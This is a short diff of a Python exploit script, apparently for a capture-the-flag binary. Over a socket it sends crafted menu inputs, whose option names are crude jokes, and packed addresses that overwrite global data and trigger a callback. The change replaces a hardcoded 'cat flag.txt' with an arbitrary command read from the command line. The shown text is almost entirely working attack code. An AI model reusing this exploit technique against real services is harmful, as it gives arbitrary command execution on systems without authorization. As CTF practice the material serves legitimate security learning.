@@ -17,7 +17,7 @@ print s.recv(2048)
 # wonder bra breasts -> allocate and write string (overwriting global info)
 s.send('(oYo)\n')
 print s.recv(2048)
-x = struct.pack('I', 0x8048578) + 'cat flag.txt'
+x = struct.pack('I', 0x804857c) + sys.argv[2]
 s.send('%s\x00%s\n' % (x, 'A' * (131 + len(x))))
 
 # pornstar breasts -> execute callback
